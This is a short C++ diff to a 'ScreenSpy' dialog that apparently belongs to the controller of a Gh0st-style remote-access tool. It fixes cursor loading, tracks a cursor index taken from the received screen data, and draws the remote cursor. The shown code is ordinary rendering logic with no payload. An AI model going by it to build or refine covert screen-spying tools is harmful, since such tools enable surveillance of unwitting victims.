@@ -37,7 +37,7 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJEC
 	GetSystemDirectory(szFullPath, MAX_PATH);
 	lstrcat(szFullPath, "\\shell32.dll");  //图标
 	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
-	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance,IDC_ARROW);
+	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance, MAKEINTRESOURCE(IDC_ARROW));
 
 	sockaddr_in  ClientAddr;
 	memset(&ClientAddr, 0, sizeof(ClientAddr));
@@ -148,6 +148,7 @@ BOOL CScreenSpyDlg::OnInitDialog()
 	m_bIsTraceCursor = FALSE;  //不是跟踪
 	m_ClientCursorPos.x = 0;
 	m_ClientCursorPos.y = 0;
+	m_bCursorIndex = 0;
 
 	SendNext();
 
@@ -230,6 +231,13 @@ VOID CScreenSpyDlg::DrawNextScreenDiff(void)
 	}
 
 	// 光标类型发生变化
+	BYTE bOldCursorIndex;
+	memcpy(&bOldCursorIndex, &m_bCursorIndex, sizeof(BYTE));
+	memcpy(&m_bCursorIndex, m_ContextObject->InDeCompressedBuffer.GetBuffer(2+sizeof(POINT)), sizeof(BYTE));
+	if (bOldCursorIndex != m_bCursorIndex)
+	{
+		bChange = TRUE;
+	}
 
 	// 屏幕是否变化
 	if (NextScreenLength > 0) 
@@ -290,7 +298,7 @@ void CScreenSpyDlg::OnPaint()
 		m_hFullDC,								
 		m_ClientCursorPos.x  - m_ulHScrollPos, 
 		m_ClientCursorPos.y  - m_ulVScrollPos,
-		m_hIcon,
+		m_hCursor,
 		0,0,										
 		0,										
 		NULL,									
